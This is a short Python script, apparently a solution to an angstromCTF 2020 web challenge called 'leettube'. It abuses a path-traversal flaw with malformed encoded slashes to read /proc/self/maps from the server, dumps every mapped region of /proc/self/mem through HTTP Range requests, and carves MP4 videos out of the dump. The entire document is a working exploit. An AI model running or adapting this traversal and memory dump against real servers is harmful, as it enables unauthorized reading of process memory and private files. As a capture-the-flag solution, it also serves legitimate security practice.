import urllib.request

f = open('memout', 'wb')
url = 'https://leettube.2020.chall.actf.co'
maps = urllib.request.urlopen(url+'/videos/%f0%2f%41%2f/%f0%2f%41%2f/../../../../proc/self/maps')
for region in maps.read().decode('utf8').split('\n'):
	if not region: continue
	start, end = (int(i, 16) for i in region.split(' ')[0].split('-'))
	mem = urllib.request.urlopen(urllib.request.Request(url+'/videos/%f0%2f%41%2f/%f0%2f%41%2f/../../../../proc/self/mem', headers={'Range': 'bytes='+str(start)+'-'+str(end)}))
	f.write(mem.read())

mem = open('memout', 'rb').read()
for i in range(len(mem)):
	if mem[i+4:i+8] == b'ftyp':
		with open('out'+str(i)+'.mp4', 'wb') as f:
			f.write(mem[i:i+10000000])
			print('wrote out'+str(i))
